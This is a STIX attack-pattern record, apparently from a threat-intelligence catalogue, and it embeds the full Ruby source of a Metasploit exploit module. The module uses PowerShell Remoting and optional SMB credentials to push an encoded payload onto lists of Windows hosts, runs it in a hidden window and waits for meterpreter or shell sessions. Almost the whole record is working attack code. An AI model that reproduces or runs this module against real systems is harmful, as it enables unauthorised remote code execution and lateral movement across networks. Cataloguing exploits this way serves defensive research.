{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4b85adca-6f2a-48ca-8e8e-d1b71a8d5e29",
    "created": "2024-08-14T16:50:09.129323Z",
    "modified": "2024-08-14T16:50:09.129327Z",
    "name": "Powershell Remoting Remote Command Execution",
    "description": " This module uses Powershell Remoting (TCP 47001) to inject payloads on target machines. If RHOSTS are specified, it will try to resolve the IPs to hostnames, otherwise use a HOSTFILE to supply a list of known hostnames.  'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/powershell_remoting.rb",
            "external_id": "powershell_remoting.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Powershell\n\n  def initialize(info = {})\n    super(update_info(info,\n          'Name'          => 'Powershell Remoting Remote Command Execution',\n          'Description'   => %q{\n            This module uses Powershell Remoting (TCP 47001) to inject payloads on target machines.\n          If RHOSTS are specified, it will try to resolve the IPs to hostnames, otherwise\n          use a HOSTFILE to supply a list of known hostnames.\n          },\n          'License'       => MSF_LICENSE,\n          'Author'        => [ 'Ben Campbell' ],\n          'References'    =>\n            [\n              [ 'CVE', '1999-0504'], # Administrator with no password (since this is the default)\n              [ 'OSVDB', '3106']\n            ],\n          'DefaultOptions' =>\n              {\n                'EXITFUNC' => 'thread'\n              },\n          'DisclosureDate' => '1999-01-01',\n          'Platform'      => [ 'win' ],\n          'SessionTypes'  => [ 'meterpreter', 'shell' ],\n          'Targets' =>\n          [\n            [ 'Automatic', { 'Arch' => [ ARCH_X86, ARCH_X64 ] } ]\n          ],\n          'DefaultTarget' => 0\n      ))\n\n    register_options([\n      OptString.new('SMBUser', [ false, 'The username to authenticate as' ], fallbacks: ['USERNAME']),\n      OptString.new('SMBPass', [ false, 'The password for the specified username' ], fallbacks: ['PASSWORD']),\n      OptString.new('SMBDomain',  [ false, 'The Windows domain to use for authentication' ], fallbacks: ['DOMAIN']),\n      OptAddressRange.new(\"RHOSTS\", [ false, \"Target address range or CIDR identifier\" ]),\n      OptPath.new('HOSTFILE', [ false, 'Line separated file with hostnames to target' ]),\n      # Move this out of advanced\n      OptString.new('ReverseListenerComm', [ false, 'The specific communication channel to use for this listener']),\n      OptBool.new(\"ExitOnSession\", [ true, \"Return from the exploit after a session has been created\", false ])\n    ])\n\n    register_advanced_options(\n      [\n        OptInt.new(\"ListenerTimeout\", [ false, \"The maximum number of seconds to wait for new sessions\", 60])\n      ])\n  end\n\n  def exploit\n    if !datastore['ExitOnSession'] && !job_id\n      fail_with(Failure::Unknown, \"Setting ExitOnSession to false requires running as a job (exploit -j)\")\n    end\n\n    unless datastore['RHOSTS'] || datastore['HOSTFILE']\n      fail_with(Failure::BadConfig, \"Need RHOSTS or HOSTFILE specified.\")\n    end\n\n    if datastore['SMBUser'] && datastore['SMBPass'].nil?\n      fail_with(Failure::BadConfig, \"Need both username and password set.\")\n    end\n\n    if datastore['RHOSTS']\n      ip_list = \"$iplist=\"\n      Rex::Socket::RangeWalker.new(datastore[\"RHOSTS\"]).each do |ip|\n        ip_list << \"'#{ip}',\"\n      end\n\n      # Remove trailing comma...\n      ip_list = ip_list[0..-2]\n      ip_list << \";\"\n    end\n\n    known_hosts = \"\"\n    if datastore['HOSTFILE']\n      ::File.open(datastore['HOSTFILE'], \"rb\").each_line do |hostname|\n        hostname.strip!\n        known_hosts << \"'#{hostname}',\" unless hostname.blank?\n      end\n      known_hosts = known_hosts[0..-2]\n    end\n\n    command = cmd_psh_payload(payload.encoded,\n                              payload_instance.arch.first,\n                              encode_final_payload: true,\n                              remove_comspec: true)\n\n    ps = <<EOF\n#{generate_credentials}\n$ResultList=@(#{known_hosts});\n#{ip_list}\nforeach($ip in $iplist){$Resultlist += [System.Net.Dns]::GetHostbyAddress($ip).HostName};\nInvoke-Command -AsJob -ComputerName $ResultList -ScriptBlock { cmd.exe /c start #{command} }\nEOF\n\n    if datastore['SMBUser']\n      ps << \" -Credential $creds\"\n    end\n\n    # If the host process terminates too quickly the jobs will die\n    # before they spawn in a new process.\n    ps << \";Sleep 20;\"\n    ps.gsub!(\"\\n\", \"\")\n\n    command = generate_psh_command_line(\n      noprofile: true,\n      windowstyle: 'hidden',\n      command: ps\n    )\n\n    print_status(\"Executing command...\")\n    begin\n      cmd_exec(command)\n    rescue Rex::TimeoutError\n    end\n\n    stime = Time.now.to_f\n    loop do\n      break if session_created? && datastore['ExitOnSession']\n      break if  datastore['ListenerTimeout'].to_i > 0 && (stime + datastore['ListenerTimeout'].to_i < Time.now.to_f)\n\n      Rex.sleep(1)\n    end\n\n    print_status(\"Completed\")\n  end\n\n  def generate_credentials(domain = datastore['SMBDomain'], user = datastore['SMBUser'], pass = datastore['SMBPass'])\n    creds = \"\"\n\n    unless user.nil?\n      creds = \"$pass=ConvertTo-SecureString -string '#{pass}' -asPlainText -force;\"\\\n      \"$creds=new-object -typename System.Management.Automation.PSCredential -argumentlist \"\n      if domain.nil?\n        creds << \"'#{user}'\"\n      else\n        creds << \"'#{domain}\\\\#{user}'\"\n      end\n\n      creds << \",$pass;\"\n    end\n\n    creds\n  end\nend\n",
    "x_mitre_disclosure_date": "1999-01-01",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}